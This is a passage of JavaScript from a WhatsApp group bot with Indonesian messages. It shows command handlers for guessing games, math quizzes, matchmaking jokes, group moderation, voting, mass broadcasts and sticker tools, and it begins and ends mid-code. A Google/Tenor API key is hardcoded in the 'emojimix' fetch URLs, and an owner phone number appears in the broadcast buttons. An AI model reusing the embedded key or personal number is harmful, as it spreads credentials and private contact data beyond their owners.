                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                jobotz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, jawab, jobotz.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, jawab, jobotz.user.name, m, {mentions: menst})
            }
            break
case 'restart':
if (!isCreator) return
await m.reply(`Restarting...`)
exec(`cd && node index`)
await sleep(4000)
m.reply('Sukses')
break
            case 'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                jobotz.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await jobotz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await jobotz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n│➳ Packname : ${global.packname}\n│➳ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
         if (!isBotAdmins) throw vnAdmin(from)
         if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw vnAdmin(from)
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await jobotz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
	    if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await jobotz.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
          if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await jobotz.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                await jobotz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw vnAdmin(from)
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                await jobotz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break

 case 'tagall': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
let teks = `
══✪〘 👥 Tag All 〙✪══
•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• 
INFO: ${q ? q : 'kosong'}
•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
 for (let mem of participants) {
 teks += `
 ╭━═════════════━• 
 │➳ @${mem.id.split('@')[0]}
 ╰━═════════════━•
 •━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
 }
 jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id),
contextInfo: {
externalAdReply: {
title: `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
body:`Runtime ${runtime(process.uptime())}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
thumbnailUrl: `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}})
}
break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            jobotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
         case 'tag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            jobotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: shield2 })
            jancok(`Tag Aja`)
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `│➳ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            jobotz.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            jobotz.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: jobotz.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            jobotz.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${jobotz.user.id}
`
jobotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === 'close'){
                    await jobotz.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await jobotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Group`, jobotz.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
             if (args[0] === 'open'){
                await jobotz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await jobotz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Edit Info`, jobotz.user.name, m)

            }
            }
            break

case 'welcome': {
if (!isCreator) return 
if (!m.isGroup) return mess.group
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Succes menyalakan welcome di group ini 🌷')
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Mati')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Succes mematikan welcome di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mode Antilink`, jobotz.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${jobotz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${jobotz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `Mute Bot`, jobotz.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
            if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                let response = await jobotz.groupInviteCode(m.chat)
                jobotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await jobotz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await jobotz.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                jobotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await jobotz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/jobotz-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      jobotz.send5ButImg(i, txt, jobotz.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/jobotz-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      jobotz.send5ButImg(yoi, txt, jobotz.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `│➳ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━│➳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➳ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                jobotz.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await jobotz.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await jobotz.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 jobotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    jobotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!isCreator) return
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await jobotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await jobotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
            if (!isCreator) return
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await jobotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!isCreator) return
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await jobotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp2': case 'ttp': {
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
